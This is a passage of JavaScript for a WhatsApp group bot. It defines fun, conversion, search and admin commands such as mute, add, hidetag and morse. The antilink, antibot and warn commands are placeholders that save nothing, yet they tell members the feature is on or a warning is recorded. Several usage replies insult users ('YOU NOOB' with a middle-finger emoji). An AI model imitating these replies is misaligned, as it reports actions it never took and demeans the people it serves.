    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("🖕 WHERE'S THE TEXT, YOU NOOB?");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.', 'f': '..-.', 'g': '--.', 'h': '....',
      'i': '..', 'j': '.---', 'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---', 'p': '.--.',
      'q': '--.-', 'r': '.-.', 's': '...', 't': '-', 'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-',
      'y': '-.--', 'z': '--..',
      '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....',
      '6': '-....', '7': '--...', '8': '---..', '9': '----.',
      '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.',
      '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-',
      '+': '.-.-.', '-': '-....-', '_': '..--.-', '"': '.-..-.', '$': '...-..-', '@': '.--.-.',
      ' ': '/'
    };
    
    // Convert to Morse code
    let morseCode = '';
    for (let i = 0; i < text.length; i++) {
      const char = text[i].toLowerCase();
      if (morseMap[char]) {
        morseCode += morseMap[char] + ' ';
      } else if (char === ' ') {
        morseCode += '/ ';
      }
    }
    
    await repondre(`📶 *Morse Code:*\n\n${morseCode}`);
  } catch (error) {
    console.error("Error in morse command:", error);
    await repondre(`💀 CONVERSION FAILED! Error: ${error.message}\nText is resisting!`);
  }
});

hango({
  nomCom: "unmorse",
  aliases: ["frommorse", "morsedecode"],
  desc: "Convert Morse code to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const morse = arg.join(" ");
    
    if (!morse) {
      return repondre("🖕 WHERE'S THE MORSE CODE, YOU NOOB?");
    }
    
    // Reverse Morse code mapping
    const reverseMorseMap = {
      '.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd', '.': 'e', '..-.': 'f', '--.': 'g', '....': 'h',
      '..': 'i', '.---': 'j', '-.-': 'k', '.-..': 'l', '--': 'm', '-.': 'n', '---': 'o', '.--.': 'p',
      '--.-': 'q', '.-.': 'r', '...': 's', '-': 't', '..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x',
      '-.--': 'y', '--..': 'z',
      '-----': '0', '.----': '1', '..---': '2', '...--': '3', '....-': '4', '.....': '5',
      '-....': '6', '--...': '7', '---..': '8', '----.': '9',
      '.-.-.-': '.', '--..--': ',', '..--..': '?', '.----.': "'", '-.-.--': '!', '-..-.': '/',
      '-.--.': '(', '-.--.-': ')', '.-...': '&', '---...': ':', '-.-.-.': ';', '-...-': '=',
      '.-.-.': '+', '-....-': '-', '..--.-': '_', '.-..-.': '"', '...-..-': '$', '.--.-.': '@',
      '/': ' '
    };
    
    // Convert from Morse code
    const text = morse.split(' ').map(code => reverseMorseMap[code] || code).join('');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unmorse command:", error);
    await repondre(`💀 CONVERSION FAILED! Error: ${error.message}\nMorse code is resisting!`);
  }
});

hango({
  nomCom: "fancy",
  aliases: ["fancytext", "styler"],
  desc: "Convert text to various fancy styles",
  categorie: "fun",
  reaction: '✨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg.length) {
      return repondre(`
🖕 WHERE'S THE TEXT, YOU NOOB?

📝 *Usage:*
• .fancy Hello World (Shows all styles)
• .fancy 2 Hello World (Uses style #2)

*Available Styles:*
1. 𝓢𝓬𝓻𝓲𝓹𝓽
2. 𝔊𝔬𝔱𝔥𝔦𝔠
3. 𝕆𝕦𝕥𝕝𝕚𝕟𝕖𝕕
4. 𝚝𝚢𝚙𝚎𝚠𝚛𝚒𝚝𝚎𝚛
5. 𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝
6. 𝗦𝗮𝗻𝘀 𝗕𝗼𝗹𝗱
7. 𝘐𝘵𝘢𝘭𝘪𝘤
8. 𝙄𝙩𝙖𝙡𝙞𝙘 𝘽𝙤𝙡𝙙
9. Ⓑⓤⓑⓔⓛⓔⓢ
10. U͟n͟d͟e͟r͟l͟i͟n͟e͟d͟`);
    }
    
    // Check if first argument is a style number
    const firstArg = arg[0];
    const styleNum = parseInt(firstArg);
    let text;
    let useNumberedStyle = false;
    
    if (!isNaN(styleNum) && styleNum >= 1 && styleNum <= 10) {
      text = arg.slice(1).join(" ");
      useNumberedStyle = true;
      
      if (!text) {
        return repondre("🖕 WHERE'S THE TEXT, YOU NOOB?");
      }
    } else {
      text = arg.join(" ");
    }
    
    if (useNumberedStyle) {
      // Convert using numbered style
      let result = "";
      
      switch (styleNum) {
        case 1: // Script
          result = convertToUnicode(text, 0x1D4B6, 0x1D4D0);
          break;
        case 2: // Gothic
          result = convertToUnicode(text, 0x1D51E, 0x1D538);
          break;
        case 3: // Outlined
          result = convertToUnicode(text, 0x1D552, 0x1D56C);
          break;
        case 4: // Typewriter
          result = convertToUnicode(text, 0x1D68A, 0x1D6A4);
          break;
        case 5: // Serif Bold
          result = convertToUnicode(text, 0x1D41A, 0x1D434);
          break;
        case 6: // Sans Bold
          result = convertToUnicode(text, 0x1D5EE, 0x1D608);
          break;
        case 7: // Italic
          result = convertToUnicode(text, 0x1D482, 0x1D49C);
          break;
        case 8: // Italic Bold
          result = convertToUnicode(text, 0x1D482, 0x1D49C);
          break;
        case 9: // Bubbles
          result = text.split("").map(char => {
            const code = char.charCodeAt(0);
            if (code >= 97 && code <= 122) return String.fromCharCode(code - 97 + 0x24D0);
            if (code >= 65 && code <= 90) return String.fromCharCode(code - 65 + 0x24B6);
            if (code >= 48 && code <= 57) return String.fromCharCode(code - 48 + 0x2460);
            return char;
          }).join("");
          break;
        case 10: // Underlined
          result = text.split("").map(char => char + "\u0332").join("");
          break;
      }
      
      await repondre(`
✨ *FANCY TEXT*

*Original:* ${text}
*Style ${styleNum}:* ${result}
      `);
    } else {
      // Show all styles
      const styles = [
        { name: "Double Struck", value: convertToUnicode(text, 0x1D552, 0x1D56C) },
        { name: "Medieval", value: convertToUnicode(text, 0x1D51E, 0x1D538) },
        { name: "Cursive", value: convertToUnicode(text, 0x1D4B6, 0x1D4D0) },
        { name: "Bold", value: convertToUnicode(text, 0x1D5EE, 0x1D608) },
        { name: "Italic", value: convertToUnicode(text, 0x1D482, 0x1D49C) }
      ];
      
      let message = `✨ *Fancy Text Styles for:* ${text}\n\n`;
      styles.forEach(style => {
        message += `*${style.name}:* ${style.value}\n`;
      });
      
      message += `\nTip: Try .fancy <number> ${text} to use specific number styles!`;
      
      await repondre(message);
    }
  } catch (error) {
    console.error("Error in fancy command:", error);
    await repondre(`💀 FANCY TEXT FAILED! Error: ${error.message}\nText is resisting!`);
  }
  
  // Helper function to convert text to Unicode styles
  function convertToUnicode(text, lowerOffset, upperOffset) {
    return text.split("").map(char => {
      const code = char.charCodeAt(0);
      if (code >= 97 && code <= 122) return String.fromCharCode(code - 97 + lowerOffset);
      if (code >= 65 && code <= 90) return String.fromCharCode(code - 65 + upperOffset);
      return char;
    }).join("");
  }
});

hango({
  nomCom: "google",
  aliases: ["search", "gsearch"],
  desc: "Search Google directly from WhatsApp",
  categorie: "search",
  reaction: '🔍',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const query = arg.join(" ");
    
    if (!query) {
      return repondre("🖕 WHERE'S THE QUERY, YOU NOOB? Example: .google WhatsApp features");
    }
    
    // Using SerpApi for Google search results
    const serpApiKey = conf.SERPAPI_KEY || "demo"; // Replace with your SerpAPI key in config
    const searchUrl = `https://serpapi.com/search.json?q=${encodeURIComponent(query)}&api_key=${serpApiKey}`;
    
    await repondre("🔍 Searching Google for: *" + query + "*");
    
    const response = await axios.get(searchUrl);
    const results = response.data.organic_results || [];
    
    if (results.length === 0) {
      return repondre("🖕 NO RESULTS FOUND, YOU NOOB!");
    }
    
    // Format top 3 results
    let message = `🔍 *Google Search Results*\n\n`;
    const topResults = results.slice(0, 3);
    
    topResults.forEach((result, index) => {
      message += `*${index + 1}. ${result.title}*\n`;
      message += `${result.snippet || "No description available."}\n`;
      message += `🔗 ${result.link}\n\n`;
    });
    
    message += `For more results: https://google.com/search?q=${encodeURIComponent(query)}`;
    
    await repondre(message);
  } catch (error) {
    console.error("Error in google command:", error);
    await repondre(`💀 SEARCH FAILED! Error: ${error.message}\nGoogle is resisting!`);
  }
});

hango({
  nomCom: "wiki",
